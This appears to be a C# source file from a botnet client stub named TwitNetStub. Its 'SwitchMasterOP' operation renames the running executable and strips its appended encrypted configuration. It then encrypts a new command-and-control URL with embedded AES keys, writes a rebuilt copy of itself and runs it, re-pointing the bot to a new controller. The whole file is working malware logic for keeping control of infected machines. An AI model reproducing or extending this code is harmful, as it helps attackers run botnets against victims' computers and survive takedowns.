using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using TwitNetStub.Util.Encryption;

namespace TwitNetStub.Operations
{
    class SwitchMasterOP : IBotOperation
    {
        public bool Finished { get; set; }
        private string MainURL;

        public SwitchMasterOP(string url)
        {
            MainURL = url;
        }

        public void Initialize()
        {
            
        }
        public void Run()
        {
            byte[] file =
                File.ReadAllBytes(Application.ExecutablePath);
            byte[] newfile = new byte[1];
            string filename = Constants.FileName;

            if (File.Exists("temp.0"))
                File.Delete("temp.0");
            File.Move(Application.ExecutablePath, "temp.0");


            for (int i = 0; i < file.Length; i++)
            {
                //if (file[i] == 31 && file[i+1] == 139 && file[i+8] == 4)//if u zip it
                if (file[i] == 0 && file[i + 1] == 124 && file[i + 2] == 115)//using |split| splitter
                {
                    newfile = new byte[i];
                    Array.Copy(file, newfile, i);
                }
            }

            //Got rid of the EOF data, the clean file is now stored in the 'newfile' byte array
            //Time to re-encrypt the new EOF data (for changed codepad page). Just rip this from the builder
            SimpleAES customAES = new SimpleAES(false);

            customAES.Key = Encoding.Default.GetBytes(Constants.CustomEncryptionKey);
            string appendData = customAES.EncryptToString(Regex.Split(MainURL, "http://")[1].Split('.')[0]);

            customAES.Key = Encoding.Default.GetBytes(Constants.DefaultEncryptionKey);
            appendData = Constants.Splitter + customAES.EncryptToString(appendData + Constants.Splitter + Constants.CustomEncryptionKey);

            StreamWriter writer = new StreamWriter(filename, false, Encoding.Default);
            writer.AutoFlush = true;
            writer.Write(Encoding.Default.GetString(newfile));
            writer.Write(appendData);
            writer.Close();

            System.Diagnostics.Process.Start(filename);
        }
    }
}
